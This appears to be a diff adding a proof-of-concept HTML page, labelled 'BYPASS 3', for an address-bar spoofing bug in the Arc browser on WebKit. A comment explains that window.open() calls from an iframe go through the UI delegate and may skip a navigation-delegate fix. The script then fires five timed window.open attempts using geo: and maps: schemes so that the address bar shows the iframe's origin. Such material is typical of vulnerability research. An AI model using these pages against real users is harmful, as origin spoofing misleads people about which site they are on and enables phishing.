@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<!--
+  BYPASS 3: window.open() from iframe
+
+  window.open() goes through WKUIDelegate.createWebViewWith configuration:navigationAction:
+  NOT through WKNavigationDelegate.decidePolicyFor.
+
+  This is a COMPLETELY DIFFERENT delegate method. The isMainFrame fix in the
+  navigation delegate might not exist in the UI delegate path.
+
+  When the iframe calls window.open("geo:0,0"), Arc's UI delegate
+  receives the request. If it reads the origin from the requesting frame
+  and updates the address bar before realizing it's a scheme navigation,
+  the bar shows the iframe's origin.
+-->
+<script>
+  setTimeout(function() {
+    // Method 1: window.open with scheme
+    try { window.open("geo:0,0"); } catch(e) {}
+  }, 200);
+
+  setTimeout(function() {
+    // Method 2: window.open targeting _top
+    try { window.open("geo:0,0", "_top"); } catch(e) {}
+  }, 500);
+
+  setTimeout(function() {
+    // Method 3: window.open targeting _parent
+    try { window.open("geo:0,0", "_parent"); } catch(e) {}
+  }, 800);
+
+  setTimeout(function() {
+    // Method 4: window.open with blank then navigate
+    try {
+      var w = window.open("about:blank", "_top");
+      if (w) {
+        setTimeout(function() {
+          try { w.location.href = "geo:0,0"; } catch(e) {}
+        }, 100);
+      }
+    } catch(e) {}
+  }, 1100);
+
+  setTimeout(function() {
+    // Method 5: window.open maps scheme
+    try { window.open("maps:?q=test"); } catch(e) {}
+  }, 1400);
+</script>
+</body>
+</html>
